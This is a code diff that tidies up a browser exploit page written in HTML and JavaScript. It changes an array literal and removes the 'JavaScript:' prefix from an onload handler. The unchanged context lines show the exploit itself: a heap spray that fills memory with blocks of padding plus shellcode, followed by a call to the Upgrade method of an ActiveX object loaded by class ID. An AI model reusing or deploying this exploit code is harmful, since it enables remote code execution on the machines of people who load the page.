@@ -89,7 +89,7 @@ var block = bigblock.substring(0,bigblock.length - slackspace);
 while (block.length + slackspace < 0x40000) block = block + block + fillblock;
 
 
-var memory = new Array();
+var memory = [];
 for (i = 0; i < 300; i++){ memory[i] = block + shellcode1 }
 
 var buf = "";
@@ -103,7 +103,7 @@ obj.Upgrade(buf,"","","");
 
 </script>
 </head>
-<body onload="JavaScript: return Check();">
+<body onload="return Check();">
 <object id="obj" classid="clsid:6054D082-355D-4B47-B77C-36A778899F48">
 Unable to create object
 </object>
